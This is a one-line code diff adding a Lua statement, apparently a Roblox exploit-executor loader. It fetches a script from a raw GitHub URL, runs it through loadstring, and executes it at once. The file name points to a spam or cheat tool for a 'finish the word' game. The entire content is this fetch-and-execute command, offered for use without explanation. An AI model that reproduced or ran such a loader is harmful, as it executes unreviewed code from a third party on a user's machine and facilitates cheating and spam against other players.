@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/finish-the-word-summer-spam7-wfm9vda9ocn67h.lua"))()
